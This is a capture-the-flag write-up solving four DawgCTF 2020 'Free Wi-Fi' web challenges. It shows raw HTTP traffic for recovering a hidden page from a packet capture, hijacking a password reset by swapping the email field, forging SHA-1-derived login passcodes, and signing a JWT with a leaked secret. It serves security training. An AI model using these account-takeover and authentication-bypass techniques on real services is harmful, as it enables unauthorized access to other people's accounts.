# DawgCTF 2020 – Free Wi-Fi

These are multiple challenges connected together. The same [PCAP file](free-wifi.pcap) is given for all the challenges.

Challenges are ordered considering the number of points.

## Free Wi-Fi Part 1

* **Category:** web/networking
* **Points:** 50

### Challenge

> People are getting online here, but the page doesn't seem to be implemented...I ran a pcap to see what I could find out.
> 
> http://freewifi.ctf.umbccd.io/
> 
> Authors: pleoxconfusa and freethepockets

### Solution

The HTML code of the page is the following.

```html
<!DOCTYPE html>
<html>
  <head>
    <title>
Guest Sign In Portal
</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Bootstrap -->
    <link href="/static/bootstrap/css/bootstrap.min.css?bootstrap=3.3.7.1.dev1" rel="stylesheet">
	<link rel="stylesheet" href="/static/css/main.css">

  </head>
  <body>
    
    

<div class="container">
  <div class="row">
    <div align="center" class="col-xs-12">

      <h1>Sorry!</h1>

      <br><br>

      <div align="left" style="background-color: lightgrey; width: 500px;  padding: 50px;  margin: 20px;">
	<h3 style="color:blue;">Guest login</h3>
      	<p class="space-above"><strong>Guest sign in portal is not yet implemented.</strong></p>
      </div>

    </div>
  </div>
</div>



    
    <script src="/static/bootstrap/jquery.min.js?bootstrap=3.3.7.1.dev1"></script>
    <script src="/static/bootstrap/js/bootstrap.min.js?bootstrap=3.3.7.1.dev1"></script>
  </body>
</html>
```

So there is anything to authenticate there.

Analyzing the [PCAP file](free-wifi.pcap) you can discover on packet #6 the existence of `https://freewifi.ctf.umbccd.io/staff.html` web page.

Connecting to it, you will discover the flag.

```
DawgCTF{w3lc0m3_t0_d@wgs3c_!nt3rn@t!0n@l}
```

## Free Wi-Fi Part 3

* **Category:** web/networking
* **Points:** 200

### Challenge

> Let's steal someone's account.
> 
> http://freewifi.ctf.umbccd.io/
> 
> Authors: pleoxconfusa and freethepockets

### Solution

The authentication page discovered during the previous step is the following.

```html
<!DOCTYPE html>
<html>
  <head>
    <title>
Staff Wifi Login Page
</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Bootstrap -->
    <link href="/static/bootstrap/css/bootstrap.min.css?bootstrap=3.3.7.1.dev1" rel="stylesheet">
	<link rel="stylesheet" href="/static/css/main.css">

  </head>
  <body>
    
    

<div class="container">
  <div class="row">
    <div align="center" class="col-xs-12">

      <h1>Welcome to the staff login page!</h1>

      <div align="left" style="background-color: lightgrey; width: 500px;  padding: 50px;  margin: 20px;">

        <h3 style="color:blue;">Staff login</h3>

      	<p>You may use either of the following methods to logon.</p>
	
	<div style="margin:15px;">

      	
<form action="" method="post"
  class="form" role="form">
  <input id="csrf_token" name="csrf_token" type="hidden" value="ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpD32g.A831bot0d-EhyWIW6fNX3jqIz9E">
  
    




<div class="form-group "><label class="control-label" for="username">Username:</label>
        
          <input class="form-control" id="username" name="username" type="text" value="">
        
  </div>


    




<div class="form-group "><label class="control-label" for="password">Password:</label>
        
          <input class="form-control" id="password" name="password" type="password" value="">
        
  </div>


    





  

  
  


    <input class="btn btn-default" id="submit" name="submit" type="submit" value="Submit">
  




    

</form>

      	<br/>

      	<p><a href="forgotpassword.html">Forgot your password?</a></p>

      	<h3> OR </h3>

      	
<form action="" method="post"
  class="form" role="form">
  <input id="csrf_token" name="csrf_token" type="hidden" value="ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpD32g.A831bot0d-EhyWIW6fNX3jqIz9E">
  
    






<div class="form-group  required"><label class="control-label" for="passcode">Login with WifiKey:</label>
        
          <input class="form-control" id="passcode" name="passcode" required type="text" value="">
        
  </div>


    





  

  
  


    <input class="btn btn-default" id="submit" name="submit" type="submit" value="Submit">
  




    

</form>

	</div>

      </div>

      	<p class="space-above"><strong>DawgCTF{w3lc0m3_t0_d@wgs3c_!nt3rn@t!0n@l}</strong></p>

    </div>
  </div>
</div>



    
    <script src="/static/bootstrap/jquery.min.js?bootstrap=3.3.7.1.dev1"></script>
    <script src="/static/bootstrap/js/bootstrap.min.js?bootstrap=3.3.7.1.dev1"></script>
  </body>
</html>
```

Analyzing the [PCAP file](free-wifi.pcap), some interesting packets can be found: #469, #471 and #473.

```
POST /forgotpassword.html HTTP/1.1
Host: freewifi.ctf.umbccd.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://freewifi.ctf.umbccd.io/forgotpassword.html
Content-Type: application/x-www-form-urlencoded
Content-Length: 171
Cookie: WifiKey nonce=MjAyMC0wNC0wOCAxNzowMw==; session=eyJjc3JmX3Rva2VuIjoiYTg4ZWQxZjVkODhhZTgyZDEzMWY4ODhmZWExZjYwNDRmNTEwMDgyMCJ9.Xo35dQ.zpNEVjf6uG_5vhqwNCE7bS8QEz0
Connection: keep-alive
Upgrade-Insecure-Requests: 1

user=true.grit%40umbccd.io&csrf_token=ImE4OGVkMWY1ZDg4YWU4MmQxMzFmODg4ZmVhMWY2MDQ0ZjUxMDA4MjAi.Xo4F8w.YzjziKX2qgE4hJ5QKC6qTjP2-0M&email=true.grit%40umbccd.io&submit=Submit

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 2420
Vary: Cookie
Server: Werkzeug/1.0.1 Python/3.6.9
Date: Wed, 08 Apr 2020 17:12:19 GMT

<!DOCTYPE html>
<html>
  <head>
    <title>
Forgot your password?
</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Bootstrap -->
    <link href="/static/bootstrap/css/bootstrap.min.css?bootstrap=3.3.7.1.dev1" rel="stylesheet">
	<link rel="stylesheet" href="/static/css/main.css">

  </head>
  <body>
    
    

<div class="container">
  <div class="row">
    <div class="col-xs-12">

      <h1>Forgot your password?</h1>

      <p class="lead">Please enter your email address.</p>
      
<form action="" method="post"
  class="form" role="form">
  <input id="user" name="user" type="hidden" value="">
<input id="csrf_token" name="csrf_token" type="hidden" value="ImE4OGVkMWY1ZDg4YWU4MmQxMzFmODg4ZmVhMWY2MDQ0ZjUxMDA4MjAi.Xo4F8w.YzjziKX2qgE4hJ5QKC6qTjP2-0M">
  
    






<div class="form-group  required"><label class="control-label" for="email">Enter your email:</label>
        
          <input class="form-control" id="email" name="email" required type="text" value="">
        
  </div>


    
    





  

  
  


    <input class="btn btn-default" id="submit" name="submit" type="submit" value="Submit">
  




    

</form>
      <script type="text/javascript">
      window.onload = function()
      {
        document.getElementsByClassName('form')[0].onsubmit = function() {
          alert(1)
          var email = document.getElementById('email')
          var user = document.getElementById('user')
          user.value = email.value
        }
      }
      </script>
      <p class="space-above"><strong>Check your email for password reset link.</strong></p>

    </div>
  </div>
</div>

<!--
TIPS about using Flask-Bootstrap:
Flask-Bootstrap keeps the default Bootstrap stylesheet in the
env/lib/python3.5/site-packages/flask_bootstrap/static/css/ directory.
You can replace the CSS file. HOWEVER, when you reinstall requirements
for your project, you would overwrite all the Bootstrap files
with the defaults.
Flask-Bootstrap templates are in
env/lib/python3.5/site-packages/flask_bootstrap/static/templates
Modifying the Bootstrap base.html template: use directives and
Jinja2's super() function. See Jinja2 documentation and also this:
https://pythonhosted.org/Flask-Bootstrap/basic-usage.html
-->



    
    <script src="/static/bootstrap/jquery.min.js?bootstrap=3.3.7.1.dev1"></script>
    <script src="/static/bootstrap/js/bootstrap.min.js?bootstrap=3.3.7.1.dev1"></script>
  </body>
</html>
```

You have discovered that:
1. a `/forgotpassword.html` page exists;
2. `true.grit@umbccd.io` is a user of the system;
3. the forgot password functionality uses two different fields for username and e-mail, with a JavaScript code to copy the value inserted into the input field.

As a consequence, it is sufficient to intercept the request and change the e-mail with one you control, leaving the discovered username.

```
POST /forgotpassword.html HTTP/1.1
Host: freewifi.ctf.umbccd.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 171
Origin: https://freewifi.ctf.umbccd.io
Connection: close
Referer: https://freewifi.ctf.umbccd.io/forgotpassword.html
Cookie: WifiKey nonce=MjAyMC0wNC0xMCAyMzozNA==; WifiKey alg=SHA1; session=eyJjc3JmX3Rva2VuIjoiYTA2MmZkNTUyNzM3NmQwMTAxYTc4YzgwMmFlNmFkOTI5ZGQzNzU3OCJ9.XpD3NA.zDj47SdpKQnikt--V9WnN0zUmYQ; JWT 'identity'=31337
Upgrade-Insecure-Requests: 1

user=true.grit%40umbccd.io&csrf_token=ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpEDtg.QX6HWsJN_M2Apsv3wUSKn4AIhl4&email=m3ssap0%40yopmail.com&submit=Submit

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Fri, 10 Apr 2020 23:40:06 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Vary: Cookie
Content-Length: 2018

<!DOCTYPE html>
<html>
  <head>
    <title>
Forgot your password?
</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Bootstrap -->
    <link href="/static/bootstrap/css/bootstrap.min.css?bootstrap=3.3.7.1.dev1" rel="stylesheet">
	<link rel="stylesheet" href="/static/css/main.css">

  </head>
  <body>
    
    

<div class="container">
  <div class="row">
    <div align="center" class="col-xs-12">

      <h1>Forgot your password?</h1>

      <div align="left" style="background-color: lightgrey; width: 500px;  padding: 50px;  margin: 20px;">
        <h3 style="color:blue;">Password recovery</h3>
      	
<form action="" method="post"
  class="form" role="form">
  <input id="user" name="user" type="hidden" value="true.grit@umbccd.io">
<input id="csrf_token" name="csrf_token" type="hidden" value="ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpED1g.iElwyWg_AQH1c72HhtcOPZVr02s">
  
    






<div class="form-group  required"><label class="control-label" for="email">Enter your email:</label>
        
          <input class="form-control" id="email" name="email" required type="text" value="m3ssap0@yopmail.com">
        
  </div>


    
    





  

  
  


    <input class="btn btn-default" id="submit" name="submit" type="submit" value="Submit">
  




    

</form>
      	<script type="text/javascript">
      	window.onload = function()
      	{
          document.getElementsByClassName('form')[0].onsubmit = function() {
            var email = document.getElementById('email')
            var user = document.getElementById('user')
            user.value = email.value
          }
      	}
        </script>
        <p class="space-above"><strong>DawgCTF{cl!3nt_s1d3_v@l!d@t!0n_1s_d@ng3r0u5}</strong></p>
      </div>
    </div>
  </div>
</div>




    
    <script src="/static/bootstrap/jquery.min.js?bootstrap=3.3.7.1.dev1"></script>
    <script src="/static/bootstrap/js/bootstrap.min.js?bootstrap=3.3.7.1.dev1"></script>
  </body>
</html>
```

The flag is the following.

```
DawgCTF{cl!3nt_s1d3_v@l!d@t!0n_1s_d@ng3r0u5}
```

## Free Wi-Fi Part 4

* **Category:** web/networking
* **Points:** 250

### Challenge

> People seem to have some doohickey that lets them login with a code...
> 
> http://freewifi.ctf.umbccd.io/
> 
> Authors: pleoxconfusa and freethepockets

### Solution

Connecting to the web site, two interesting cookies are set:

```
Set-Cookie: WifiKey nonce=MjAyMC0wNC0xMCAyMzo1Mg==; Path=/
Set-Cookie: WifiKey alg=SHA1; Path=/
```

Analyzing the [PCAP file](free-wifi.pcap), some POST requests passing `passcode` value can be found. Considering the SHA-1 algorithm discovered before in the cookie value and applying that algorithm to the wi-fi nonces captured, you will discover that `passcode` values are just the first 8 chars of the hashed `nonce` value.

```
#85
Cookie: WifiKey nonce=MjAyMC0wNC0wOCAxNzowMQ==  -> 2020-04-08 17:01
passcode=5004f47a
SHA-1(MjAyMC0wNC0wOCAxNzowMQ==) = 5004f47ae3e2e7c1c9a5ea4d1666f95e6b06b062

#217
Cookie: WifiKey nonce=MjAyMC0wNC0wOCAxNzowMg==  -> 2020-04-08 17:02
passcode=01c7aeb1
SHA-1(MjAyMC0wNC0wOCAxNzowMg==) = 01c7aeb11b1ee82035e9dc9e0292088d559921b1

#339
Cookie: WifiKey nonce=MjAyMC0wNC0wOCAxNzowMw==  -> 2020-04-08 17:03
passcode=097b3acf
SHA-1(MjAyMC0wNC0wOCAxNzowMw==) = 097b3acf84e6ed9e66f285cf3750b4ff89da48dc

#655
Cookie: WifiKey nonce=MjAyMC0wNC0wOCAxNzoxMw==  -> 2020-04-08 17:13
passcode=54f03ae2
SHA-1(MjAyMC0wNC0wOCAxNzoxMw==) = 54f03ae2cc8d1415bf06dec1670e03fd4e696982
```

The same process can be applied to your `nonce`.

```
Cookie: WifiKey nonce=MjAyMC0wNC0xMSAwMDowNw== -> 2020-04-11 00:07
SHA-1(MjAyMC0wNC0xMSAwMDowNw==) = ef07d9f7a0f3cce235a644fbb8392f211025aa98
passcode=ef07d9f7
```

In order to perform a request.

```
POST /staff.html HTTP/1.1
Host: freewifi.ctf.umbccd.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 134
Origin: https://freewifi.ctf.umbccd.io
Connection: close
Referer: https://freewifi.ctf.umbccd.io/staff.html
Cookie: WifiKey nonce=MjAyMC0wNC0xMSAwMDowNw==; WifiKey alg=SHA1; session=eyJjc3JmX3Rva2VuIjoiYTA2MmZkNTUyNzM3NmQwMTAxYTc4YzgwMmFlNmFkOTI5ZGQzNzU3OCJ9.XpD3NA.zDj47SdpKQnikt--V9WnN0zUmYQ; JWT 'identity'=31337
Upgrade-Insecure-Requests: 1

csrf_token=ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpEKKA.bAfOYEeMNYEl-nFUD9XT9rSH0YI&passcode=ef07d9f7&submit=Submit

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 11 Apr 2020 00:07:25 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Set-Cookie: WifiKey nonce=MjAyMC0wNC0xMSAwMDowNw==; Path=/
Set-Cookie: WifiKey alg=SHA1; Path=/
Set-Cookie: JWT 'secret'="dawgCTF?heckin#bamboozle"; Path=/
Vary: Cookie
Content-Length: 2594

<!DOCTYPE html>
<html>
  <head>
    <title>
Staff Wifi Login Page
</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Bootstrap -->
    <link href="/static/bootstrap/css/bootstrap.min.css?bootstrap=3.3.7.1.dev1" rel="stylesheet">
	<link rel="stylesheet" href="/static/css/main.css">

  </head>
  <body>
    
    

<div class="container">
  <div class="row">
    <div align="center" class="col-xs-12">

      <h1>Welcome to the staff login page!</h1>

      <div align="left" style="background-color: lightgrey; width: 500px;  padding: 50px;  margin: 20px;">

        <h3 style="color:blue;">Staff login</h3>

      	<p>You may use either of the following methods to logon.</p>
	
	<div style="margin:15px;">

      	
<form action="" method="post"
  class="form" role="form">
  <input id="csrf_token" name="csrf_token" type="hidden" value="ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpEKPQ.xW__Gp06GnXV1BdSSbKG-ZgPtyI">
  
    




<div class="form-group "><label class="control-label" for="username">Username:</label>
        
          <input class="form-control" id="username" name="username" type="text" value="">
        
  </div>


    




<div class="form-group "><label class="control-label" for="password">Password:</label>
        
          <input class="form-control" id="password" name="password" type="password" value="">
        
  </div>


    





  

  
  


    <input class="btn btn-default" id="submit" name="submit" type="submit" value="Submit">
  




    

</form>

      	<br/>

      	<p><a href="forgotpassword.html">Forgot your password?</a></p>

      	<h3> OR </h3>

      	
<form action="" method="post"
  class="form" role="form">
  <input id="csrf_token" name="csrf_token" type="hidden" value="ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpEKPQ.xW__Gp06GnXV1BdSSbKG-ZgPtyI">
  
    






<div class="form-group  required"><label class="control-label" for="passcode">Login with WifiKey:</label>
        
          <input class="form-control" id="passcode" name="passcode" required type="text" value="ef07d9f7">
        
  </div>


    





  

  
  


    <input class="btn btn-default" id="submit" name="submit" type="submit" value="Submit">
  




    

</form>

	</div>

      </div>

      	<p class="space-above"><strong>DawgCTF{k3y_b@s3d_l0g1n!}</strong></p>

    </div>
  </div>
</div>



    
    <script src="/static/bootstrap/jquery.min.js?bootstrap=3.3.7.1.dev1"></script>
    <script src="/static/bootstrap/js/bootstrap.min.js?bootstrap=3.3.7.1.dev1"></script>
  </body>
</html>
```

The flag is the following.

```
DawgCTF{k3y_b@s3d_l0g1n!}
```

## Free Wi-Fi Part 2

* **Category:** web/networking
* **Points:** 300

### Challenge

> I saw someone's screen and it looked like they stayed logged in, somehow...
> 
> http://freewifi.ctf.umbccd.io/
> 
> Authors: pleoxconfusa and freethepockets

### Solution

At this point, you can spot two interesting cookies:
* `JWT 'identity'=31337`;
* `JWT 'secret'="dawgCTF?heckin#bamboozle"`.

Analyzing the capture, you can find two packets, #261 and #263, regarding a JWT-related endpoint.

```
GET /jwtlogin HTTP/1.1
Host: freewifi.ctf.umbccd.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: WifiKey nonce=MjAyMC0wNC0wOCAxNzowMg==; session=eyJjc3JmX3Rva2VuIjoiYTg4ZWQxZjVkODhhZTgyZDEzMWY4ODhmZWExZjYwNDRmNTEwMDgyMCJ9.Xo35dQ.zpNEVjf6uG_5vhqwNCE7bS8QEz0
Connection: keep-alive
Upgrade-Insecure-Requests: 1

HTTP/1.0 401 UNAUTHORIZED
Content-Type: application/json
Content-Length: 125
WWW-Authenticate: JWT realm="Login Required"
Server: Werkzeug/1.0.1 Python/3.6.9
Date: Wed, 08 Apr 2020 17:02:35 GMT

{
  "description": "Request does not contain an access token", 
  "error": "Authorization Required", 
  "status_code": 401
}
```

You can use [JWT.io website](https://jwt.io/) to craft a valid JWT with `31337` identity and signed with `dawgCTF?heckin#bamboozle` secret.

```
{"alg":"HS256","typ":"JWT"}.{"identity":31337,"iat":1586564945,"nbf":1586564945,"exp":1586908800}.Hx0gLrzRZy4lGdEhvV_eIpdpSSa_pd6FQVBy1pMVNPE

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6MzEzMzcsImlhdCI6MTU4NjU2NDk0NSwibmJmIjoxNTg2NTY0OTQ1LCJleHAiOjE1ODY5MDg4MDB9.Hx0gLrzRZy4lGdEhvV_eIpdpSSa_pd6FQVBy1pMVNPE
```

Calling the endpoint with the JWT in the `Authorization` header will give you the flag.

```
GET /jwtlogin HTTP/1.1
Host: freewifi.ctf.umbccd.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: WifiKey nonce=MjAyMC0wNC0xMSAwMDoxNg==; WifiKey alg=SHA1; session=eyJjc3JmX3Rva2VuIjoiYTA2MmZkNTUyNzM3NmQwMTAxYTc4YzgwMmFlNmFkOTI5ZGQzNzU3OCJ9.XpD3NA.zDj47SdpKQnikt--V9WnN0zUmYQ; JWT 'identity'=31337; JWT 'secret'="dawgCTF?heckin#bamboozle"
Authorization: JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6MzEzMzcsImlhdCI6MTU4NjU2NDk0NSwibmJmIjoxNTg2NTY0OTQ1LCJleHAiOjE1ODY5MDg4MDB9.Hx0gLrzRZy4lGdEhvV_eIpdpSSa_pd6FQVBy1pMVNPE
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 11 Apr 2020 00:35:23 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 27

DawgCTF{y0u_d0wn_w!t#_JWT?}
```